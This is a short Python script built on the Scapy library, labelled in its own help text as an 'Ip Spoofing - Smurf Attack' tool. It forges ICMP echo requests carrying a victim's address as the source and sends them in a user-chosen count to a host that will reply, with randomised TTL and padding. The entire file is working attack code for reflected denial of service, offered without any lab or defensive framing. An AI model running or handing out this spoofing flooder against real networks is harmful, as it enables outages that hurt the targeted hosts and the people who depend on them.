try:
    from scapy.all import *
    from scapy.layers.inet import *
    import argparse
except Exception as e:
    print(e)
    exit()

def main():
    args = ArgumentParse()
    seq = random.randint(10, 20)
    ttl = random.randint(100, 150)
    r = GetRaw(args.size)
    spoof = IP(src=args.src, dst=args.dst, ttl=ttl) / ICMP(type="echo-request", id=1, seq=seq) / Raw(r)
    for i in range(args.count):
        spoof[ICMP].seq += i
        spoof[IP].ttl += random.randint(-2, 2)
        send(spoof)


def GetRaw(size):
    ret = ""

    if size is None:
        ret = "abcdefghijklmnopqrstuvwabcdefghi"

    else:
        if (size <= 44):
            ret = "ab"
        else:
            size -= 42
            for i in range(size):
                ret += chr(ord('a')+random.randint(0, 25))

    return ret


def ArgumentParse():
    parser = argparse.ArgumentParser(prog='main.py',
                                     description='Ip Spoofing - Smurf Attack',
                                     formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=80))
    parser.add_argument("-s", "--src", metavar="Source IP", help="Enter IP to spoof", required=True, type=str)
    parser.add_argument("-d", "--dst", metavar="Destination IP", help="Enter IP that will send the echo replay",
                        required=True, type=str)
    parser.add_argument("-n", "--count", metavar="Count", help="amount of packets to send", required=True, type=int)
    parser.add_argument("-l", "--size", metavar="Size", help="Set buffer size", type=int)
    args = parser.parse_args()
    return args


if __name__ == "__main__":
    main()
